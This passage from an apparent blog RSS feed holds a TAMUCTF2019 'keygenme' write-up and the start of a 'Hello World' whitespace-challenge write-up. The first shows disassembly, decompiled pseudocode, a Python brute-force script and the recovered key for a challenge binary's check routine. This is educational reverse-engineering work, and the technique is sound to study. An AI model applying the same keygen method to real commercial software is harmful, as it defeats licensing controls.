&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;flag.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A string that everybody likes to see, but I don’t have a flag.txt? Do you?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;Too bad the flag is only on the remote server!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;String, even if we bypassed the checking functions using the disassembler locally we would not be able to retrieve our flag because it’s been hosted remotely.&lt;/p&gt;

&lt;p&gt;So with this quick overview of the strings, we now know that we have to create our own keygen to beat this challenge.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code3.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analyzing the binary with hopper disassembler there are 3 functions that get our attention&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;0x92a P enc
0x9da P verify_key
0xa46 P main&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s pretty clear what each function is doing so I’m gonna skip that whole explanation and focus on the verify_key function first.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code4.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That part is at the beginning of the function verify_key and its job is to get our input, our “KEY”, and checks if its size is bigger than 0x9 in hexa aka 9 in decimal xd.&lt;/p&gt;

&lt;p&gt;So, important information, we must supply a key that is longer than 9 digits, noted.&lt;/p&gt;

&lt;p&gt;Right after this block, there’s a check to see if our input is larger than 0x40 bytes, since we will no be providing a key this long, I’m gonna skip it.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code5.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are a few import things we must consider on this part of the function.&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;The enc function is called by verify_key and not by main.&lt;/li&gt;
	&lt;li&gt;Right after enc function is called our modified key is compared to [OIonU2_&amp;lt;__nK&amp;lt;KsK
	&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Now it’s clear that we have to provide some input that after it passes the enc function it has to be equal to that strange string we saw early on.&lt;/p&gt;

&lt;p&gt;Now we have to go through the enc function and figure what it is doing with our input and reverse it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;0000000000000960         mov        eax, dword [rbp+var_10]    ; CODE XREF=enc+168
0000000000000963         movsxd     rdx, eax
0000000000000966         mov        rax, qword [rbp+var_28]
000000000000096a         add        rax, rdx
000000000000096d         movzx      eax, byte [rax]
0000000000000970         movsx      eax, al
0000000000000973         lea        edx, dword [rax+0xc]
0000000000000976         movzx      eax, byte [rbp+var_11]
000000000000097a         imul       eax, edx
000000000000097d         lea        ecx, dword [rax+0x11]
0000000000000980         mov        edx, 0xea0ea0eb
0000000000000985         mov        eax, ecx
0000000000000987         imul       edx
0000000000000989         lea        eax, dword [rdx+rcx]
000000000000098c         sar        eax, 0x6
000000000000098f         mov        edx, eax
0000000000000991         mov        eax, ecx
0000000000000993         sar        eax, 0x1f
0000000000000996         sub        edx, eax
0000000000000998         mov        eax, edx
000000000000099a         imul       eax, eax, 0x46
000000000000099d         sub        ecx, eax
000000000000099f         mov        eax, ecx
00000000000009a1         lea        ecx, dword [rax+0x30]
00000000000009a4         mov        eax, dword [rbp+var_10]
00000000000009a7         movsxd     rdx, eax
00000000000009aa         mov        rax, qword [rbp+var_8]
00000000000009ae         add        rax, rdx
00000000000009b1         mov        edx, ecx
00000000000009b3         mov        byte [rax], dl
00000000000009b5         mov        eax, dword [rbp+var_10]
00000000000009b8         movsxd     rdx, eax
00000000000009bb         mov        rax, qword [rbp+var_8]
00000000000009bf         add        rax, rdx
00000000000009c2         movzx      eax, byte [rax]
00000000000009c5         mov        byte [rbp+var_11], al
00000000000009c8         add        dword [rbp+var_10], 0x1
loc_9cc:
00000000000009cc         mov        eax, dword [rbp+var_10]         ; CODE XREF=enc+52
00000000000009cf         cmp        eax, dword [rbp+var_C]
00000000000009d2         jl         loc_960&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;using this part and the hopper pseudo code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;var_C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIDWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffffea0ea0eb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I managed to write this whole process in python and I noticed that the next key’s value always depends on its previous neighbor. So to discover what key generates this [OIonU2_&amp;lt;__nK&amp;lt;KsK, I simply brute forced it XD.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python 
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;enckeyFINAL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[OIonU2_&amp;lt;__nK&amp;lt;KsK&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#G&amp;gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;'()*+,-./0123456789:;&amp;lt;=&amp;gt;?@[]^_`{|}~'&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;		
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffffea0ea0eb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enckeyFINAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt;
		 
	

	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://gist.githubusercontent.com/D4nPs/7c71f549298b7e64101133b45df4cdeb/raw/94d7270e776c192477b23393f54b11a6244fa9c8/test.py&quot; class=&quot;btn btn-blue&quot;&gt;LINK BASE GITHUB&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By running this script I got&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;GHZxSZcfov09&amp;lt;GNRB&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s send to the server and get our FLAG!&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code6.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well…Maybe not 😢.&lt;/p&gt;

&lt;p&gt;Let’s use gdb-PEDA to find out why we did not get our deserved flag.&lt;/p&gt;

&lt;p&gt;I set up a breakpoint right before my input and that awful string are compared and I got this.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code7.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the program adds this “\n” and I’m not sure why.&lt;/p&gt;

&lt;p&gt;That thing made me wonder for a while why that’s there and how to bypass it.&lt;/p&gt;

&lt;p&gt;Then I found the solution to be very simple (and a bit of luck maybe?). This “\n” is changing into “i” because it’s after a “B”, so I have to find a character that change “\n” into “K”.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code8.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the “R” was there all along to save me.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code9.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/tamuctf2019-keygenme-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-keygenme-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>RATF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>TAMUCTF2019 Hello World Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Hey guys! This post I’ll be showing you how I solved the Hello World Challenge from TAMUCTF2019.&lt;/p&gt;

&lt;p&gt;This was a MISC challenge rated as medium difficulty by the CTF organizers.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded the file and used the cat command on it.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It showed something like that. That made me think, what are those blank spaces?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;00000000: 2020 2009 0920 2009 0909 0a20 2020 0909     ..  ....   ..                                                                                                                                                                    
00000010: 2009 2020 090a 2020 2009 0920 2009 0909   .  ..   ..  ...                                                                                                                                                                    
